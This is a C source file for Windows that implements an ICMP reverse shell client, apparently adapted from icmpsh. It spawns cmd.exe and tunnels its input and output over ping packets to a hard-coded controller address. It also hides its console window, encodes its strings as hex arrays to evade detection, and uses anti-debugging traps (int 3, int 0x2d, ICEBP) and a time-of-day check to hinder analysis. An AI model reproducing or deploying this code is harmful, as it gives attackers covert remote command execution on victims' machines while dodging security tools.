#define _WIN32_WINNT 0x0500
#define WIN32_LEAN_AND_MEAN
// clang-format off
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
// clang-format on

#define ICMP_HEADERS_SIZE (sizeof(ICMP_ECHO_REPLY) + 8)

#define STATUS_OK 0
#define STATUS_SINGLE 1
#define STATUS_PROCESS_NOT_CREATED 2

#define TRANSFER_SUCCESS 1
#define TRANSFER_FAILURE 0

#define DEFAULT_TIMEOUT 3000
#define DEFAULT_DELAY 200
#define DEFAULT_MAX_BLANKS 10
#define DEFAULT_MAX_DATA_SIZE 64
#pragma comment(lib, "user32.lib")

FARPROC icmp_create, icmp_send, to_ip;

int verbose = 0;

int spawn_proc(PROCESS_INFORMATION *pi, HANDLE *out_read, HANDLE *in_write,
               LPSTR proc) {
  SECURITY_ATTRIBUTES sattr;
  STARTUPINFOA si;
  HANDLE in_read, out_write;

  memset(&si, 0x00, sizeof(SECURITY_ATTRIBUTES));
  memset(pi, 0x00, sizeof(PROCESS_INFORMATION));

  // create communication pipes
  memset(&sattr, 0x00, sizeof(SECURITY_ATTRIBUTES));
  sattr.nLength = sizeof(SECURITY_ATTRIBUTES);
  sattr.bInheritHandle = TRUE;
  sattr.lpSecurityDescriptor = NULL;

  if (!CreatePipe(out_read, &out_write, &sattr, 0)) {
    return STATUS_PROCESS_NOT_CREATED;
  }
  if (!SetHandleInformation(*out_read, HANDLE_FLAG_INHERIT, 0)) {
    return STATUS_PROCESS_NOT_CREATED;
  }

  if (!CreatePipe(&in_read, in_write, &sattr, 0)) {
    return STATUS_PROCESS_NOT_CREATED;
  }
  if (!SetHandleInformation(*in_write, HANDLE_FLAG_INHERIT, 0)) {
    return STATUS_PROCESS_NOT_CREATED;
  }

  // spawn process
  memset(&si, 0x00, sizeof(STARTUPINFO));
  si.cb = sizeof(STARTUPINFO);
  si.hStdError = out_write;
  si.hStdOutput = out_write;
  si.hStdInput = in_read;
  si.dwFlags |= STARTF_USESTDHANDLES;

  if (!CreateProcessA(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL,
                      (LPSTARTUPINFOA)&si, pi)) {
    return STATUS_PROCESS_NOT_CREATED;
  }

  CloseHandle(out_write);
  CloseHandle(in_read);

  return STATUS_OK;
}

void create_icmp_channel(HANDLE *icmp_chan) {
  // create icmp file
  *icmp_chan = (HANDLE)icmp_create();
}

int transfer_icmp(HANDLE icmp_chan, unsigned int target, char *out_buf,
                  unsigned int out_buf_size, char *in_buf,
                  unsigned int *in_buf_size, unsigned int max_in_data_size,
                  unsigned int timeout) {
  int rs;
  char *temp_in_buf;
  int nbytes;

  PICMP_ECHO_REPLY echo_reply;

  temp_in_buf = (char *)malloc(max_in_data_size + ICMP_HEADERS_SIZE);
  if (!temp_in_buf) {
    return TRANSFER_FAILURE;
  }

  // send data to remote host
  rs = icmp_send(icmp_chan, target, out_buf, out_buf_size, NULL, temp_in_buf,
                 max_in_data_size + ICMP_HEADERS_SIZE, timeout);

  // check received data
  if (rs > 0) {
    echo_reply = (PICMP_ECHO_REPLY)temp_in_buf;
    if (echo_reply->DataSize > max_in_data_size) {
      nbytes = max_in_data_size;
    } else {
      nbytes = echo_reply->DataSize;
    }
    memcpy(in_buf, echo_reply->Data, nbytes);
    *in_buf_size = nbytes;

    free(temp_in_buf);
    return TRANSFER_SUCCESS;
  }

  free(temp_in_buf);

  return TRANSFER_FAILURE;
}

int load_deps() {

  TCHAR hid_ws_____zR8TTZOznC07[] = {'\x77', '\x73', '\x32', '\x5f',
                                     '\x33', '\x32', '\x2e', '\x64',
                                     '\x6c', '\x6c', 0};
  TCHAR hid_inet_a_EAeBKDzDWezX[] = {'\x69', '\x6e', '\x65', '\x74', '\x5f',
                                     '\x61', '\x64', '\x64', '\x72', 0};
  TCHAR hid_iphlpa_syOFzyn9VELz[] = {'\x69', '\x70', '\x68', '\x6c', '\x70',
                                     '\x61', '\x70', '\x69', '\x2e', '\x64',
                                     '\x6c', '\x6c', 0};
  TCHAR hid_IcmpCr_Xbh3aCepxJRA[] = {'\x49', '\x63', '\x6d', '\x70', '\x43',
                                     '\x72', '\x65', '\x61', '\x74', '\x65',
                                     '\x46', '\x69', '\x6c', '\x65', 0};
  TCHAR hid_IcmpSe_Aw7mKC9RzBBm[] = {'\x49', '\x63', '\x6d', '\x70', '\x53',
                                     '\x65', '\x6e', '\x64', '\x45', '\x63',
                                     '\x68', '\x6f', 0};
  TCHAR hid_ICMP_D_dSx2UIxtIX1Y[] = {'\x49', '\x43', '\x4d', '\x50', '\x2e',
                                     '\x44', '\x4c', '\x4c', 0};
  TCHAR hid_IcmpCr_CtOS8eXixySl[] = {'\x49', '\x63', '\x6d', '\x70', '\x43',
                                     '\x72', '\x65', '\x61', '\x74', '\x65',
                                     '\x46', '\x69', '\x6c', '\x65', 0};
  TCHAR hid_IcmpSe_cIPMmuEOnxdv[] = {'\x49', '\x63', '\x6d', '\x70', '\x53',
                                     '\x65', '\x6e', '\x64', '\x45', '\x63',
                                     '\x68', '\x6f', 0};
  TCHAR hid_failed_az4jZpZRs8Y6[] = {
      '\x66', '\x61', '\x69', '\x6c', '\x65', '\x64', '\x20', '\x74',
      '\x6f', '\x20', '\x6c', '\x6f', '\x61', '\x64', '\x20', '\x66',
      '\x75', '\x6e', '\x63', '\x74', '\x69', '\x6f', '\x6e', '\x73',
      '\x20', '\x28', '\x25', '\x75', '\x29', 0};

  HMODULE lib;

  lib = LoadLibraryA(hid_ws_____zR8TTZOznC07);
  if (lib != NULL) {
    to_ip = GetProcAddress(lib, hid_inet_a_EAeBKDzDWezX);
    if (!to_ip) {
      return 0;
    }
  }

  lib = LoadLibraryA(hid_iphlpa_syOFzyn9VELz);
  if (lib != NULL) {
    icmp_create = GetProcAddress(lib, hid_IcmpCr_Xbh3aCepxJRA);
    icmp_send = GetProcAddress(lib, hid_IcmpSe_Aw7mKC9RzBBm);
    if (icmp_create && icmp_send) {
      return 1;
    }
  }

  lib = LoadLibraryA(hid_ICMP_D_dSx2UIxtIX1Y);
  if (lib != NULL) {
    icmp_create = GetProcAddress(lib, hid_IcmpCr_CtOS8eXixySl);
    icmp_send = GetProcAddress(lib, hid_IcmpSe_cIPMmuEOnxdv);
    if (icmp_create && icmp_send) {
      return 1;
    }
  }

  printf(hid_failed_az4jZpZRs8Y6, GetLastError());

  return 0;
}

// Check if time exceed
int tcheck() {
  struct tm *nt;
  __time64_t long_time;
  _time64(&long_time);
  nt = _localtime64(&long_time);
  return (nt->tm_hour < 18);
}

int qq() {

  TCHAR hid_Test___t3KzLws7Qkdt[] = {'\x54', '\x65', '\x73', '\x74', '\x31',
                                     '\x32', '\x33', '\x34', '\n',   0};
  TCHAR hid_Proces_B5fYMd5lMOxd[] = {
      '\x50', '\x72', '\x6f', '\x63', '\x65', '\x73', '\x73', '\x20', '\x77',
      '\x61', '\x73', '\x20', '\x6e', '\x6f', '\x74', '\x20', '\x63', '\x72',
      '\x65', '\x61', '\x74', '\x65', '\x64', '\n',   0};
  TCHAR hid_Error__l6jOoBH2KK12[] = {
      '\x45', '\x72', '\x72', '\x6f', '\x72', '\x3a', '\x20', '\x52',
      '\x65', '\x61', '\x64', '\x46', '\x69', '\x6c', '\x65', '\x20',
      '\x66', '\x61', '\x69', '\x6c', '\x65', '\x64', '\x20', '\x77',
      '\x69', '\x74', '\x68', '\x20', '\x25', '\x69', '\n',   0};
  TCHAR hid_Error__5y8rfcWY5hbv[] = {
      '\x45', '\x72', '\x72', '\x6f', '\x72', '\x3a', '\x20', '\x50',
      '\x65', '\x65', '\x6b', '\x4e', '\x61', '\x6d', '\x65', '\x64',
      '\x50', '\x69', '\x70', '\x65', '\x20', '\x66', '\x61', '\x69',
      '\x6c', '\x65', '\x64', '\x20', '\x77', '\x69', '\x74', '\x68',
      '\x20', '\x25', '\x69', '\n',   0};
  int opt;
  char *target;
  unsigned int delay, timeout;
  unsigned int ip_addr;
  HANDLE pipe_read, pipe_write;
  HANDLE icmp_chan;
  unsigned char *in_buf, *out_buf;
  unsigned int in_buf_size, out_buf_size;
  DWORD rs;
  int blanks, max_blanks;
  PROCESS_INFORMATION pi;
  int status;
  unsigned int max_data_size;
  struct hostent *he;
  int err_count;

  // set defaults
  target = 0;
  timeout = DEFAULT_TIMEOUT;
  delay = DEFAULT_DELAY;
  max_blanks = DEFAULT_MAX_BLANKS;
  max_data_size = DEFAULT_MAX_DATA_SIZE;

  status = STATUS_OK;
  if (!load_deps()) {
    // printf("failed to load ICMP library\n");
    return -1;
  }
  // icmpsh.exe -t "$IP" -d 500 -b 30 -s 128
  target = MY_IP;
  delay = 300;
  max_blanks = 30;
  max_data_size = 128;

  if (!target) {
    // printf("you need to specify a host with -t. Try -h for more options\n");
    return -1;
  }
  ip_addr = to_ip(target);
  // Hide window
  ShowWindow(GetConsoleWindow(), SW_HIDE);

  // don't spawn a shell if we're only sending a single test request
  if (status != STATUS_SINGLE) {
    status = spawn_proc(&pi, &pipe_read, &pipe_write, "cmd");
  }

  // create icmp channel
  create_icmp_channel(&icmp_chan);
  if (icmp_chan == INVALID_HANDLE_VALUE) {
    // printf("unable to create ICMP file: %u\n", GetLastError());
    return -1;
  }

  // allocate transfer buffers
  in_buf = (char *)malloc(max_data_size + ICMP_HEADERS_SIZE);
  out_buf = (char *)malloc(max_data_size + ICMP_HEADERS_SIZE);
  if (!in_buf || !out_buf) {
    // printf("failed to allocate memory for transfer buffers\n");
    return -1;
  }
  memset(in_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);
  memset(out_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);

  // sending/receiving loop
  blanks = 0;
  err_count = 0;
  do {
    __try {
      __asm
      {
      int 0x2d
      xor eax, eax
      add eax, 3
      }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
    }
    if (tcheck()) {
      break;
    }
    switch (status) {
    case STATUS_SINGLE:
      // reply with a static string
      out_buf_size = sprintf(out_buf, hid_Test___t3KzLws7Qkdt);
      break;
    case STATUS_PROCESS_NOT_CREATED:
      // reply with error message
      out_buf_size = sprintf(out_buf, hid_Proces_B5fYMd5lMOxd);
      break;
    default:
      // read data from process via pipe
      out_buf_size = 0;
      if (PeekNamedPipe(pipe_read, NULL, 0, NULL, &out_buf_size, NULL)) {
        err_count = 0;
        if (out_buf_size > 0) {
          out_buf_size = 0;
          rs = ReadFile(pipe_read, out_buf, max_data_size, &out_buf_size, NULL);
          if (!rs && GetLastError() != ERROR_IO_PENDING) {
            out_buf_size =
                sprintf(out_buf, hid_Error__l6jOoBH2KK12, GetLastError());
          }
        }
      } else {
        out_buf_size =
            sprintf(out_buf, hid_Error__5y8rfcWY5hbv, GetLastError());
        err_count += 1;
      }
      break;
    }
    if (err_count > 25) {
      // Delay termination
      goto q;
    }
    // send request/receive response
    if (transfer_icmp(icmp_chan, ip_addr, out_buf, out_buf_size, in_buf,
                      &in_buf_size, max_data_size,
                      timeout) == TRANSFER_SUCCESS) {
      if (status == STATUS_OK) {
        // write data from response back into pipe
        WriteFile(pipe_write, in_buf, in_buf_size, &rs, 0);
      }
      blanks = 0;
    } else {
      // no reply received or error occured
      blanks++;
    }

    // wait between requests
    Sleep(delay);

  } while (status == STATUS_OK && blanks < max_blanks);
q:
  if (status == STATUS_OK) {
    TerminateProcess(pi.hProcess, 0);
  }

  return 0;
}

void Trampoline2() {
  if (tcheck()) {
    return;
  }
  __try {
    // ICE
    __asm __emit 0xf1;
  } __except (EXCEPTION_EXECUTE_HANDLER) {
    qq();
  }
}

void Trampoline1() {
  __try {
    __asm int 3;
  } __except (EXCEPTION_EXECUTE_HANDLER) {
    Trampoline2();
  }
}

int main(int argc, char **argv) {
  __try {
    __asm int 3;
  } __except (EXCEPTION_EXECUTE_HANDLER) {
  }
  { Trampoline1(); }

  return 0;
}